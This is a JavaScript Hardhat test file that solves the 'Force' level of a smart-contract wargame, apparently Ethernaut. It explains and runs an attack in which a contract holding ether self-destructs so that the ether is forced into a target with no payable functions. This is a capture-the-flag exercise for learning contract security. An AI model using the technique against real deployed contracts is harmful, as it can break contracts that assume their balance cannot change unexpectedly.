const { expect } = require("chai");
const { ethers } = require("hardhat");

/**

███████╗░█████╗░██████╗░░█████╗░███████╗
██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝
█████╗░░██║░░██║██████╔╝██║░░╚═╝█████╗░░
██╔══╝░░██║░░██║██╔══██╗██║░░██╗██╔══╝░░
██║░░░░░╚█████╔╝██║░░██║╚█████╔╝███████╗
╚═╝░░░░░░╚════╝░╚═╝░░╚═╝░╚════╝░╚══════╝
 
 * Goal: 
 * 
 * 1. The goal of this level is to make the balance of the Force contract greater than zero.
 * 
 * Solution:
 *
 * Since the Force contract has no payable or fallback functions to deposit funds, 
 * the only way is to deposit them using the contract as a backup following a 
 * self-destruct of a contract containing funds.
 * Simply send funds to one of our contracts and self-destruct it, thus sending 
 * the funds to the Force contract.
 * 
 * Note:
 * 
 * There are 3 methods for your contract to receive ether:
 * 1. via payable functions (ex. fallback function)
 * 2. receiving mining rewards
 * 3. from a destroyed contract (sends its ethers to a backup address) 
 * 
 */
describe("Force", function () {
    let force, forceAttacker, owner, player;

    before(async function () {
        [owner, player] = await ethers.getSigners();
    });

    describe("Attack", async function () {
        before(async function () {
            const Force = await ethers.getContractFactory("contracts/Force/Force.sol:Force");
            force = await Force.connect(owner).deploy();

            // player deploy the attacker smart contract
            const ForceAttacker = await ethers.getContractFactory("contracts/Force/ForceAttacker.sol:ForceAttacker");
            forceAttacker = await ForceAttacker.connect(player).deploy(force.address);
        });

        it("Should send an amount of ether to attacker contract", async function () {
            await forceAttacker.connect(player).deposit({ value: ethers.utils.parseEther("1") });
            expect(await ethers.provider.getBalance(forceAttacker.address)).to.be.eq(ethers.utils.parseEther("1"));
        });

        it("Should increment the balance of Force contract", async function () {
            expect(await ethers.provider.getBalance(force.address)).to.be.eq(0);

            await forceAttacker.connect(player).destroy();

            expect(await ethers.provider.getBalance(force.address)).to.be.eq(ethers.utils.parseEther("1"));

        });
    });
});
